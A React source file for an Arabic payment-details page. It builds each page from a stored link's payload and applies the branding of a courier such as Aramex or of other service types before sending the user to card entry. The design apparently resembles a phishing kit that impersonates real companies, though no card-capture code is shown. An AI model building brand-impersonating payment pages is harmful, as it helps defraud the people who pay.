import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getServiceBrandingByType, getServiceTitle, getServiceIcon } from "@/lib/serviceBranding";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useLocalStorage";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, FileText, Heart, Building2, User, Calendar } from "lucide-react";
import { formatCurrency } from "@/lib/countries";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  if (!linkData) {
    return null;
  }
  
  const serviceType = linkData.type || 'shipping';
  const payload = linkData.payload;
  const serviceBranding = getServiceBrandingByType(serviceType);
  const serviceTitle = getServiceTitle(serviceType);
  
  // For shipping services, get specific branding
  const serviceKey = payload?.service_key || 'aramex';
  const shippingBranding = serviceType === 'shipping' ? getServiceBranding(serviceKey) : null;
  
  // Get service name
  const getServiceName = () => {
    switch (serviceType) {
      case 'chalet': return payload.chalet_name;
      case 'shipping': return payload.service_name;
      case 'invoice': return `فاتورة رقم ${payload.invoice_number}`;
      case 'health': return payload.service_name;
      case 'logistics': return payload.service_name;
      case 'contract': return payload.contract_type_name;
      default: return 'خدمة';
    }
  };
  
  const serviceName = getServiceName();
  
  // Get total amount
  const getTotalAmount = () => {
    switch (serviceType) {
      case 'chalet': return payload.total_amount;
      case 'shipping': return payload.cod_amount;
      case 'invoice':
      case 'health':
      case 'logistics':
      case 'contract': return payload.amount;
      default: return 0;
    }
  };
  
  const amount = getTotalAmount();
  const currency = payload.currency || 'ر.س';
  const formattedAmount = formatCurrency(amount, currency);
  
  // Use shipping branding colors if available, otherwise use service branding
  const colors = shippingBranding?.colors || {
    primary: serviceBranding.primaryColor,
    secondary: serviceBranding.secondaryColor
  };
  
  const handleProceed = () => {
    navigate(`/pay/${id}/card`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceType === 'shipping' ? serviceKey : serviceType}
      amount={formattedAmount}
      title="تفاصيل الدفع"
      description={`صفحة دفع آمنة ومحمية لـ ${serviceTitle.ar}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Service Info Display */}
      <div className="mb-6 sm:mb-8 p-4 rounded-xl border-2" 
           style={{ 
             borderColor: colors.primary + '30',
             background: `linear-gradient(135deg, ${colors.primary}10, ${colors.secondary}10)`
           }}>
        <div className="flex items-center gap-3 mb-4">
          <span className="text-4xl">{getServiceIcon(serviceType)}</span>
          <div>
            <h3 className="font-bold text-lg">{serviceTitle.ar}</h3>
            <p className="text-sm text-muted-foreground">{serviceName}</p>
          </div>
        </div>
        
        <div className="space-y-2 text-sm">
          {/* Shipping Details */}
          {serviceType === 'shipping' && (
            <>
              {payload.tracking_number && (
                <DetailRow icon={<Hash className="w-4 h-4" />} label="رقم الشحنة" value={payload.tracking_number} />
              )}
              {payload.package_description && (
                <DetailRow icon={<Package className="w-4 h-4" />} label="وصف الطرد" value={payload.package_description} />
              )}
            </>
          )}
          
          {/* Chalet Details */}
          {serviceType === 'chalet' && (
            <>
              <DetailRow icon={<Calendar className="w-4 h-4" />} label="عدد الليالي" value={`${payload.nights} ليلة`} />
              <DetailRow icon={<User className="w-4 h-4" />} label="عدد الضيوف" value={`${payload.guest_count} ضيف`} />
            </>
          )}
          
          {/* Invoice Details */}
          {serviceType === 'invoice' && (
            <>
              <DetailRow icon={<FileText className="w-4 h-4" />} label="رقم الفاتورة" value={payload.invoice_number} />
              <DetailRow icon={<User className="w-4 h-4" />} label="العميل" value={payload.client_name} />
            </>
          )}
          
          {/* Health Details */}
          {serviceType === 'health' && (
            <>
              <DetailRow icon={<Heart className="w-4 h-4" />} label="مقدم الخدمة" value={payload.provider_name} />
              <DetailRow icon={<User className="w-4 h-4" />} label="المريض" value={payload.patient_name} />
            </>
          )}
          
          {/* Logistics Details */}
          {serviceType === 'logistics' && (
            <>
              <DetailRow icon={<Truck className="w-4 h-4" />} label="الشركة" value={payload.company_name} />
              <DetailRow icon={<User className="w-4 h-4" />} label="المسؤول" value={payload.contact_person} />
            </>
          )}
          
          {/* Contract Details */}
          {serviceType === 'contract' && (
            <>
              <DetailRow icon={<FileText className="w-4 h-4" />} label="رقم العقد" value={payload.contract_number} />
              <DetailRow icon={<User className="w-4 h-4" />} label="الطرف الأول" value={payload.first_party_name} />
            </>
          )}
        </div>
      </div>
      
      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
          <span className="text-muted-foreground">{serviceTitle.ar}</span>
          <span className="font-semibold">{serviceName}</span>
        </div>
        
        <div 
          className="flex justify-between py-4 sm:py-5 rounded-xl px-4 sm:px-5 shadow-lg"
          style={{
            background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
          }}
        >
          <span className="text-base sm:text-lg font-bold text-white">المبلغ الإجمالي</span>
          <span className="text-xl sm:text-3xl font-bold text-white">
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method */}
      <div className="mb-6 sm:mb-8">
        <h3 className="font-semibold mb-3 text-sm sm:text-base flex items-center gap-2">
          <CreditCard className="w-5 h-5" style={{ color: colors.primary }} />
          طريقة الدفع
        </h3>
        <div 
          className="border-2 rounded-xl p-4 sm:p-5 transition-all hover:shadow-lg"
          style={{
            borderColor: colors.primary,
            background: `linear-gradient(135deg, ${colors.primary}08, ${colors.secondary}08)`
          }}
        >
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-lg" style={{ background: colors.primary + '20' }}>
              <CreditCard className="w-6 h-6" style={{ color: colors.primary }} />
            </div>
            <div>
              <p className="font-bold text-base">الدفع بالبطاقة البنكية</p>
              <p className="text-sm text-muted-foreground">
                Visa • Mastercard • Mada • Amex
              </p>
            </div>
          </div>
        </div>
      </div>
      
      {/* Security Badge */}
      <div className="mb-6 p-3 rounded-lg bg-secondary/30 flex items-center gap-2 text-xs">
        <span className="text-2xl">🔒</span>
        <div>
          <p className="font-semibold">دفع آمن ومحمي</p>
          <p className="text-muted-foreground">جميع المعاملات مشفرة بأعلى معايير الأمان</p>
        </div>
      </div>
      
      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full text-lg py-7 text-white shadow-xl hover:shadow-2xl transition-all"
        style={{
          background: serviceBranding.gradient
        }}
      >
        <span className="ml-2">متابعة الدفع - {formattedAmount}</span>
        <ArrowLeft className="w-5 h-5 mr-2" />
      </Button>
    
      <p className="text-xs text-center text-muted-foreground mt-4">
        بالمتابعة، أنت توافق على <span className="underline">الشروط والأحكام</span> وسياسة الخصوصية
      </p>
    </DynamicPaymentLayout>
  );
};

// Helper Component
const DetailRow = ({ icon, label, value }: { icon: React.ReactNode; label: string; value: string }) => (
  <div className="flex items-center gap-2 text-muted-foreground">
    {icon}
    <span>{label}:</span>
    <span className="font-semibold text-foreground">{value}</span>
  </div>
);

export default PaymentDetails;
